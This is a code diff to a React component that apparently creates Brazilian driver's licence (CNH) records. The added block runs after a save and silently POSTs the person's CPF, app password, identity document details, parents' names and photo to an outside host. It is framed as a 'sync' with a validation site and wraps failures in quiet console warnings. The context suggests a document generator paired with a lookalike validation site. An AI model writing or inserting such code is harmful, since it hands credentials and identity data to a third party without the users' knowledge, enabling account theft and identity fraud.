@@ -260,6 +260,42 @@ export default function CNHCria() {
         setSaved(true);
         setShowConfirmModal(false);
         setShowSuccessModal(true);
+
+        // ─── Sincronizar credenciais com o site de validação CNH Digital ───
+        try {
+          const syncUrl = "https://cnh-digital.manus.space/api/cnh-sync";
+          await fetch(syncUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              cpf: data.cpf,
+              senha: data.senhaApp,
+              nome: data.nome,
+              rg: data.rg,
+              orgaoEmissor: data.orgaoEmissor,
+              ufRg: data.ufRG,
+              dataNascimento: data.dataNascimento,
+              registro: data.registro,
+              espelho: data.espelho,
+              categoria: data.categoria,
+              localEmissao: data.localEmissao,
+              ufEmissao: data.ufEmissao,
+              emissao: data.dataEmissao,
+              validade: data.validade,
+              primeiraHabilitacao: data.primeiraHabilitacao,
+              nacionalidade: data.nacionalidade,
+              filiacaoMae: data.nomeMae,
+              filiacaoPai: data.nomePai,
+              sexo: data.sexo,
+              acc: data.tipo === "Permissão" ? "SIM" : "NÃO",
+              numeroFormulario: data.espelho,
+              foto: data.fotoUrl,
+              validationId: codigo,
+            }),
+          }).catch(e => console.warn("Sync CNH Digital falhou (não crítico):", e));
+        } catch (syncErr) {
+          console.warn("Sync CNH Digital falhou (não crítico):", syncErr);
+        }
       } else {
         toast.error(result.error || "Erro ao gerar CNH");
         setShowConfirmModal(false);
